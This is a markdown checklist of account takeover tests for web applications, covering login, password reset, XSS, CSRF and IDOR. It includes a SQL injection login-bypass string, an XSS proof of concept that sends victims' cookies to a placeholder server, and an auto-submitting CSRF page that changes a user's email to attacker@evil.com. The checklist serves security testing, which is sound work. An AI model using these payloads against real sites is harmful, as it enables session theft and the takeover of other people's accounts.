## Account Takeover Checklist

- login:
    1. check if you are able to brute force the password

    2. Test for OAuth misconfigurations

    3. check if you are able to bruteforce the login OTP

    4. check for JWT mesconfigurations

    5. Test for SQL injection to bypass authentication

        ```admin" or 1=1;--```
    6. check if the application validates the OTP or Token

- password reset:
    1. check if you are able to brute force the password reset OTP

    2. test for token predectability

    3. test for JWT misconfigurations

    4. check if the password reset endpoint is vulnerable to IDOR

    5. check if the password reset endpoint is vulnerable to Host Header injection

    6. check if the password reset endpoint is leaking the token or OTP in the HTTP response

    7. check if the application validates the OTP or Token

- XSS to Account Takeover

    1. try to exfiltrate the cookies

    2. try to exfiltrate th Auth Token

    3. if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies

    - PoC Example:
        ```html
        <script>
            /*
            this script will create a hidden <img> element
            when the browser tries to load the image
            the victim's cookies will be sent to your server
            */

            var new_img = document.createElement('img');
            new_img.src = "http://yourserver/" + document.cookie;
            new_img.style = 'display: none;'
            document.body.appendChild(new_img);
        </script>

        ```

- CSRF to Account Takeover

    1. check if the email update endpoint is vulnerable to CSRF

    2. check if the password change endpoint is vulnerable to CSRF

    - PoC Example:
        ```html
            <html>
                <head>
                    <title>CSRF PoC</title>    
                <head>
                <body>
                    <form name='attack' action='https://example.com/update-email' method='POST'>
                        <input type="hidden" name="new_email" value="attacker@evil.com">
                        <input type="submit" name="submit" value="submit" hidden>
                    <form>
                    <script>
                        document.attack.submit.click()
                    </script>
                </body>
            </html>
        ```

- IDOR to Account Takerover

    1. checck if the email update endpoint is vulnerable to IDOR

    2. check if the password change endpoint is vulnerable to IDOR

    3. check if the password reset endpoint vulnerable to IDOR
